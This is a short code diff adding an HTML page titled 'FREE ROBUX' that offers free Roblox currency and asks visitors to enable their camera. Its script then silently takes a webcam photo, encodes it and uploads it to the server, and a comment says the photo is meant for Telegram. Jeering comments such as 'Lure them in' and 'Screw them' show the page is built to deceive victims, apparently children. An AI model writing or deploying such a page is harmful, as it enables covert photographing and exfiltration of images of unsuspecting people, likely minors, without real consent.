@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>👉 FREE ROBUX 👈</title> <!-- Lure them in 🤡 -->
+</head>
+<body>
+    <h1>Click "Accept" for free Robux! (Enable camera first!)</h1>
+    <button onclick="stealPhoto()">ACCEPT</button>
+
+    <script>
+        // Sneaky webcam access 🎥
+        async function stealPhoto() {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const track = stream.getVideoTracks()[0];
+            const imageCapture = new ImageCapture(track);
+            const blob = await imageCapture.takePhoto();
+            
+            // Convert to base64 for Telegram 🚀
+            const reader = new FileReader();
+            reader.onloadend = () => {
+                fetch('/snap', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: reader.result }),
+                });
+            };
+            reader.readAsDataURL(blob);
+            track.stop(); // Screw them 😂
+        }
+    </script>
+</body>
+</html>
